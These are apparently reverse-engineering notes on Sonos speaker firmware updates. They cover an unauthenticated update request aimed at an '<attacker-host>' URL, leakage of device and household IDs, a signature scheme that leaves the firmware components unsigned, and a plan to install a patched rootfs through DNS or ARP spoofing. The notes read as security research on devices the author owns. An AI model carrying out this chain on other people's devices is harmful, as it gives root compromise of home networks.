# Update feed and package signature gate (S1 57.23, 2026-10-22)

Owner-directed RE. This extends the live update-path probe in
[`FIRMWARE_PATHS.md`](FIRMWARE_PATHS.md) with the direct-package path and the
signature gate's internals. No device identifiers or keys are committed.

## Feed primitive

`ZoneGroupTopology.BeginSoftwareUpdate` is unauthenticated on the LAN and
fetches any URL given in `UpdateURL`:

```http
POST /ZoneGroupTopology/Control HTTP/1.1
SOAPACTION: "urn:schemas-upnp-org:service:ZoneGroupTopology:1#BeginSoftwareUpdate"

<u:BeginSoftwareUpdate>
  <Flags>0</Flags>
  <UpdateURL>http://<attacker-host>:8080/pkg.upd</UpdateURL>
</u:BeginSoftwareUpdate>
```

The player appends its own query string to that URL:

```
?cmaj=57&cmin=23&cbld=<build>&subm=<submodel>&rev=1&reg=1
 &serial=<serial>&sonosid=<id>&householdid=<household>
```

so an arbitrary LAN host receives the model/build, serial, Sonos ID and
household ID. A `.upm` manifest is parsed as XML; a direct `.upd` is fetched
whole (an official 5.6 MB package completes) and handed to the root
`upgrade` process. Parsing happens **before** signature verification, so
unsigned packages are a pre-auth, root-context parser surface.

Invalid packages cause a reboot after the attempt but are not installed.
A signed 34.16 image is fetched but does not stick (minimum-compatible
version gate).

## Package shape

An `.upd` is a sequence of sections at offset 0, each `magic 497f1635`,
`u32 type`, `u32 total_length`, `u32 flags`, then `total_length - 16` payload
bytes (all little-endian). Relevant types: 1 version header (`u32 cmaj`,
`u32 cmin`, `u32 build`), 3 preinstall script, 4 rootfs, 6 kernel, 21
capabilities, 22 signature.

Component payloads (3/4/6 and the signature) are encrypted with a
`886499ca` envelope:

```
magic | u32 header_len | u32 00010000 | 8 zero bytes
u8 recipient_len | u8 03 | recipient bytes
u32 cipher_id=1 | u32 rsa_len | RSA-OAEP(SHA-1) AES key
u32 cipher_id=1 | u32 data_len | 16-byte IV + AES-CBC ciphertext
```

`header_len = 0x14 + 2 + recipient_len + 8 + rsa_len + 8`. The recipient is
the model key family; model-16 keys are recoverable from a plaintext 34.16
updater, so arbitrary sections can be re-encrypted for the owner's ZPS5
players.

## Signature gate

After the sections are read, `upgrade` calls `ZZ0121` on the type-17 payload
and then `ZZ0124`/`ZZ0125` to verify. The type-22 payload is a **364-byte
header** (the parser reads `header_len = 0x16c`, big-endian as a `u32` at +4)
followed by a 149 KB `rcbundle` (a public CA root bundle plus Sonos roots,
magic `rcbundle`, rootfs fallback `/etc/fallback_trusted_roots.rcb`).

The 364-byte header is a custom TLV, not ASN.1:

- `u32` magic `621da74d`, `u32 header_len`, `u16` version 1, `u16` field;
- two `u32` lists of typed records (each record parsed by `ZZ0026`);
- `u8` certificate count, then per entry: `u32 name_len <= 0x7ff`, a
  certificate **Name** (X.509 RDNSequence, not a whole certificate), a key
  type byte, a `u32`, `u32 key_len <= 0x100`, and a raw key blob. Entries are
  laid out in `0x910` slots; two maximum entries fill the `0x22c0` struct
  exactly, so the layout is intentional;
- a 33-byte `alg + digest` field, algorithm ids, a `0x100`-byte signature,
  and the literal `rcbundle`.

`ZZ0126` verifies the certificate Name with a caller callback and then
verifies the digest signature with the entry's key. A header whose **second
list count is 0** skips the post-loop chain check entirely, so the entry is
verified only against itself; the wire fields and the exact ordering are in
the next section. `ZZ0124`/`ZZ0125` do the policy checks;
`ZZ0118`/`ZZ0119`/`ZZ0120` validate key type, signature algorithm and a
constant field.

Section dispatch puts the real work on **type 17 (`application`)**, not type
22: the handler table maps `0x11` to `0x1000868c`, which reads only
`section_len - 16` and runs `ZZ0121`/`ZZ0124`. `ZZ0124` is a tail call to
`ZZ0125`; the verify callback is `ZZ0109` (PKCS#1 v1.5). The digest passed
in is the 32-byte **SHA-256** state at `DAT_1002c564`, accumulated while the
two list records are read, and it is exactly
`SHA256(type17_payload[0x10:0x49])`. Type 22 is a model-independent
rcbundle container (364-byte header + 149 KB bundle) shared byte-for-byte
between models, and is not consulted by this verifier.

The `.upd` signature blob is 256 bytes (RSA-2048). The two accepted signer
names map to hardcoded SPKIs inside `libsonoscrypto`; private halves are not
shipped. UPM signatures are a separate, 128-byte/1024-bit scheme.

An unsigned package does **not** run the type-3 preinstall, even when the
section is correctly encrypted to the model key and the package carries a
copied signature section. Confirmed with a `wget` callback and by starting
`telnetd` from the script. Not bypassed by:

- `Flags` 0..31 plus 256/4096/65536/2^31/2^32-1;
- `ExtraOptions` guesses (`bForceUpdate=1`, `force=1`, updater flags
  `-X`, `-Y`, `-n`, `-F`, `-f`, `-s`, combinations);
- keeping the old signature while modifying only the preinstall;
- a signed older package.

## Rootfs repack (for when a signature exists)

The 57.23 kernel mounts **squashfs 3.0 only**; `mksquashfs` 4.x images do
not boot, and even 3.4/v3.1 output matches the superblock less closely.
Use the **3.0 source**, which after glibc fixes produces a superblock
byte-identical to the original apart from timestamps and offsets. Build on a
modern glibc with:

```
CFLAGS="-I. -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -D_GNU_SOURCE \
 -O2 -std=gnu89 -fgnu89-inline -fcommon -include sys/sysmacros.h"
make mksquashfs
```

Use `mksquashfs <dir> rootfs.bin -be -all-root -noappend -b 65536`. A
one-byte `VERSION` edit survives and the image remains exactly the original
4,571,136 bytes with version 3.0 and flags 0x40. A patched image and package
are kept locally under `captures/firmware/`.

## The manifest is the real gate

`BeginSoftwareUpdate` does **not** take a package URL. Anacapad treats
`UpdateURL` as the URL of an `update.upm` **manifest**: it fetches exactly
that URL (adding the device query itself), parses `<update_manifest>` and
`<image model=...>`, and only then fetches the selected image. A direct
`.upd` URL is therefore fetched *as if it were a manifest*, fails the XML
parse, and merely reboots.

The manifest is signed by a **separate 1024-bit RSA key** in a trailing
comment:

```
<!-- SIGNATURE:<128-byte signature, 256 hex chars> -->
```

57.23 enforces it. Feeding a manifest with edited `<image>` URLs (or an
unsigned one) is downloaded and then ignored: no image request follows.
The current public feed manifest is
`http://update-firmware.sonos.com/firmware/Prod/57.23-74170-v11.16.1-DILU1Q33hC-GA-1/update.upm`;
on model 16 it still points at the **34.16** milestone
(`.../34.16-37101-v7.1-nzhemz-MS-1/^34.16-37101`), so it is also the
supported downgrade path.

Because type 17 signs only the 57-byte list region, a package carrying the
**original type-17 section** (and the original type-22 bundle) is valid
regardless of component contents. The remaining blocker is the manifest's
own signature, and it can be sidestepped without any key:

1. keep the manifest **byte-identical** so its signature still matches;
2. make `update-firmware.sonos.com` resolve to the local server;
3. serve the exact image path from the manifest with the patched package.

The path is plain HTTP, so a DNS override (router host, or an ARP+DNS spoof
with forwarding) is sufficient. The manifest URL passed to
`BeginSoftwareUpdate` must exist locally too and end in `/`; anacapad
appends `update.upm`.



- Unsigned `.upm` manifests are fetched and parsed but never lead to an
  image fetch; the manifest signature is enforced.
- An unsigned `.upd` is fetched and parsed, then rejected; the reboot is
  unconditional, not a sign of installation.
- The kernel rejects squashfs 4.x; v3.0 is required.

## Live install trials (unsigned)

Four patched-rootfs packages were fed to a bench player; all were fetched in
full and caused a reboot, and every one returned to the old rootfs:

- v3.1 image (3.4-built, minor patched to 0): fell back to the old rootfs
  after roughly four minutes;
- true v3.0 image (3.0-built, exact superblock): rebooted, came back briefly
  ping-only with no TCP services, then reboot-looped, and finally fell back;
- same image with `VERSION` given its original trailing newline: fell back;
- same image with a realistic build bump (`57.23-74171` instead of 99020):
  fell back.

The ping-only window is not a successful boot; anacapad never served. The
component image format is therefore not the blocking gate either: with the
original type-17 the signature is valid, so these direct-`.upd` trials never
reached `upgrade` in the first place. `BeginSoftwareUpdate` wants a manifest
(below), and anacapad only reboots on the parse failure.

## Header layout, decoded (libsonoscrypto / librcb)

Artifacts (public, from `anacapad-internals`): `lib/libsonoscrypto.so.3`
(sha256 `7ba2531b9c5921e4…`) exports `ZZ0121` (header parser, `0x9e14`),
`ZZ0125` (`0xa384`, per-entry verify loop), `ZZ0126` (`0xa618`),
`ZZ0109` (`0x8ec4`, actual RSA verify), `ZZ0118/0119/0120` (validators) and
`ZZ0026` (`0x3fd4`, typed-record copier). `lib/libsonos-root-cert-bundle.so.2`
(sha256 `4cd8ae0486d1d68f…`) exports `sonosRcbParseHeader`/`sonosRcbVerifySig`.
Both are PPC and readable; the layouts below come from their code, not from
guessing.

The 364-byte header is a TLV, exactly:

```
0x00 u32 magic 621da74d      0x04 u32 header_len (0x16c)
0x08 u16 version == 1        0x0a u16 field
0x0c u32 list1 count <= 8    0x10 u32 list2 count <= 8
0x14 list2 records, then list1 records (each: u32 type, u32 len <= 0x40
     unless (type>>1)==5, then u32 type + 4-byte value + u32 value2)
```

then, in order:

```
u8 cert_count (1 or 2), then per entry:
   u32 name_len <= 0x7ff
   u8  keytype (1..4, ZZ0119)
   name[name_len]                      (opaque id, not DER)
   u8  sig_alg (1..4, ZZ0118)
   u32 field (== 1, ZZ0120)
   u32 sig_len (0x100)
   sig[sig_len]                        (RSA-2048 signature)
```

All of it must fit `header_len`; the parser rejects any overrun. Field
lengths map to digest sizes 1→32, 2→16, 3→20, 4→28, and the signature length
must equal the hash length implied by the *entry's* alg. In the shipped
type-22 header the records are: type 2 (`alg 1` + 32-byte digest), type 3
(4-byte value), then `cert_count = 1`, `name_len = 20`, `keytype = 3`,
`sig_alg = 1`, `field = 1`, `sig_len = 0x100` and 256 bytes ending exactly
at `header_len`.

`ZZ0125` runs this per entry: the **name callback** (`ZZ0039` in `upgrade`)
resolves the Name to a key handle, then `ZZ0109` verifies the 256-byte
signature over the digest against that key. With `list2 count == 0` the
post-loop chain check is skipped (`0xa60c`), so a header that carries no
second list is verified only against the entry itself. Type-22 additionally
appends `rcbundle\0<version>\0<pad>` plus the DER cert table; `upgrade`
installs it to `/jffs/sys/run/rcb/<name>` **before** the type-3 script is
written, which is how a bundle can supply the key that type 17 then needs.

Types 17 and 22 are stored **in plaintext** (magic `621da74d` at offset 0 of
the payload). Types 3, 4 and 6 are wrapped in the `886499ca` envelope, and
all three of one package share the same wrapped AES key:
```
886499ca | u32 header_len (0x13a) | u32 00010000 | 8 * 00
u8 recipient_len | u8 03 | recipient | u32 00000001 | u32 rsa_len
RSA-OAEP(SHA-1) AES key | u32 00000001 | u32 data_len | 16-byte IV | ciphertext
```

so **editing the preinstall script on this line also means re-encrypting it**
to the model key; the plaintext-script edits in the earlier trials could
never be read.

**What the digest covers.** For the type-22 section the 32-byte digest is
exactly `SHA-256` of the section's own bundle bytes (everything after the
364-byte header) — verified against the shipped package. For type 17 the
digest is **SHA-256 of exactly `payload[0x10:0x49]`** — the two algorithm
lists and their records, 57 bytes, ending just before `cert_count`. Nothing
else: not the magic, not the header, not the name/signature, and no component.
This was proved by RSA-verifying the shipped signature with the embedded
verifier key and matching the recovered `DigestInfo` digest byte-for-byte.
Consequences:

- the components (kernel, preinstall, rootfs) are **not signed** at all, so a
  correctly encrypted patched rootfs needs no new signature;
- the type-17 signature only needs redoing if the two list records change;
- a self-signed bundle does not help with type 17, because the verifier key
  table is hardcoded (below).

**Name resolution.** `ZZ0039` accepts only `keytype == 3` and a **20-byte**
name, then `memcmp`s it against **two hardcoded entries** in
`libsonoscrypto.so.1` (names `d67d7a0749635410ab3013a37418d4fb6de57de6` and
`4cde17c6b9966c3084231fd84296c5b59d052d44`). Each entry stores a DER SPKI
pointer (RELATIVE relocs, addends `0xdc08`/`0xdae0`) and a `0x126` length;
both are 2048-bit RSA keys with `e = 65537`, parsed by
`mbedtls_x509_crt_parse` / `mbedtls_pk_parse_public_key`. The private halves
are not on the device: signing a *modified list* would need one. The 16-byte
`0x00000001` and signature come from the type-17 entry, and `ZZ0109` calls
`mbedtls_rsa_rsassa_pkcs1_v15_verify` (alg 1 → SHA-256).



## 86.10 / S2 delta

The S2 line (PPC, 86.10) uses a different container layout. A stock
86.10-80260-1-9 package is ordered:

```
1 (28) | 21 (144) | 2 (44) | 2 (148) | 2 (44) | 22 (149527)
       | 3 (1946) | 6 | 4 | 13 | 17 (380)
```

with no `ffffffff` trailer. Type 21 is a plain-text capability list; type 22
is the rcbundle container (364-byte `621da74d` header + 149 KB bundle) and is
placed **before** the type-3 script, so verification can gate script
execution structurally on this line. Type 13 is an `886499ca` envelope, type
17 the `application`/verify section, whose handler is `0x1000868c` in the PPC
`upgrade`. The gate internals above are unchanged; only the dispatch order and
the added types differ.

Transfer behaviour: a plain Python `http.server` (with or without
`Content-Length`, HTTP/1.1 or 1.0) makes the player's `wget -qC <url> -T 300
-O - -` stop after exactly 131072 bytes. **Apache completes the same file
in one request** (`01:01`, `200 15919011` in the access log), and the shipped
package then reaches the parser, the script and the reboot. So the 128 KiB
cut is an artefact of the Python server, not of the device, and every further
test should be served by Apache.

With the full package delivered, three variants still do not change
`/status/zp` (`86.10-81100`): pristine 86.10-80260, the same with a version
header forced to 87.0, and the same with the model field switched 9 -> 8
(this player is `S12`/Play:1, the package is `limelight`/model 9, so the
image is for a Playbar). Each still reboots, i.e. the attempt reaches the
flash/reboot stage and rolls back; the model mismatch is the likely reason
the image does not take. Reaching the flash write is still enough for the
goal, because the type-3 script runs as root before it and writes `/jffs`.

A correctly ordered, completely downloaded 2.3 KB package
(records 1/21/2/2/2/3) still did not execute the type-3 script: probe writes
to `/tmp` and `/jffs` never appeared. That package copied the **encrypted**
type-3 record, and it was encrypted for model 9 while the test player is
model 8, so the device could not unwrap the section AES key at all. The
2.3 KB result therefore does not by itself prove that an unsigned package
skips the script; the S1 evidence for that gate stands on its own.

Observed on a Play:1 (model 8) with the Playbar package: the attempt
always reboots, but **the type-3 script never runs** -- `/jffs/upgrade.log`,
which the shipped script writes, is absent after every attempt, including a
byte-identical re-assembly of the package used as a control. Replacing the
encrypted type-3 payload with a **plaintext** script is also not executed,
so the reader needs the envelope (no plaintext fallback) or verification
fails before the script. A forged type-22 header (self-signed over the
unchanged bundle, DigestInfo signature, fresh 20-byte name) is accepted as
far as the download and the reboot, and behaves like the original.

Consequence for the plan: **the model-8 (Play:1) public key is required**
before a script of ours can run, because the AES key must be RSA-OAEP wrapped
to it. The Playbar package only exercises the parser, the policy checks and
the rollback path on this hardware.

## Next

1. **Finish the DNS-offset install.** Keep the signed manifest untouched;
   point `update-firmware.sonos.com` at the server (router host entry, or the
   running ARP/DNS spoof), serve the manifest's exact
   `.../34.16-37101-v7.1-nzhemz-MS-1/^34.16-37101` path, and confirm with a
   packet capture that the player requests the image. Start with the real
   34.16 package to prove the route end to end (expect a downgrade reboot),
   then serve the patched 57.23 package at the same path.
2. If the route proves out, the patched package needs no crypto changes at
   all: keep the original type-17 and type-22 sections byte-for-byte, keep
   `VERSION` with its trailing newline, and use the true v3.0 image.
3. If the spoof route is unavailable, get the ASUS router credential for a
   one-line local DNS override, or sign a manifest (needs the 1024-bit
   manifest key, not the updater keys).
4. Watch only for the `/xml/review.xsl` `PWNED-ROOTFS-MARKER`; `VERSION`
   proves nothing when the build is unchanged.
5. Local PPC execution is still blocked (`qemu-ppc` user mode segfaults on
   every rootfs binary); `qemu-system-ppc` or a PPC cross-build remains the
   only local oracle.

